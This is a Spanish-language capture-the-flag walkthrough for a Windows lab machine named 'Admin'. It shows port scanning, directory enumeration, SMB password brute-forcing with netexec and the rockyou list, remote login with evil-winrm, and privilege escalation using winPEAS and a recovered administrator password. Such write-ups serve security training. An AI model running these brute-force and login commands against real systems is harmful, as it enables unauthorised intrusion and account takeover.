---
description: '🔍 Dificultad: Fácil'
---

# Admin

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.58
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.58 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1124).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, los puertos **80, 135, 139, 445, 5040, 5985, 47001** y varios en el rango **49664-49670** están abiertos. Estos pertenecen a los servicios de **HTTP, Microsoft RPC, NetBIOS-SSN, Microsoft-DS, WinRM** y otros puertos desconocidos, por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p80,135,139,445,5985,47001 -v 192.168.1.58
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1126).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (1127).png" alt=""><figcaption></figcaption></figure>

Revisamos directorios.

```bash
gobuster dir -u http://192.168.1.58 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```

<figure><img src="../../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

Encontramos interesante **/tasks.txt**. Miramos el contenido.

<figure><img src="../../.gitbook/assets/image (1128).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Encontramos hope como posible usuario. Realizamos fuerza bruta.

```bash
netexec smb 192.168.1.58 -u 'hope' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

<figure><img src="../../.gitbook/assets/image (1129).png" alt=""><figcaption></figcaption></figure>

Nos conectamos al sistema con **evil-winrm**.

```bash
evil-winrm -i 192.168.1.58 -u "hope" -p "loser"
```

<figure><img src="../../.gitbook/assets/image (1130).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Subo **winPEAS** para una búsqueda a fondo para escalar privilegios.

{% @github-files/github-code-block url="https://github.com/peass-ng" %}

<figure><img src="../../.gitbook/assets/image (1131).png" alt=""><figcaption></figcaption></figure>

Ejecutamos. Encontramos un archivo con la contraseña y usuario.

<figure><img src="../../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>

Nos conectamos con **evil-winrm**. Ya somos **root**.

```
evil-winrm -i 192.168.1.58 -u 'administrator' -p 'SuperAdministrator123'
```

<figure><img src="../../.gitbook/assets/image (1134).png" alt=""><figcaption></figcaption></figure>
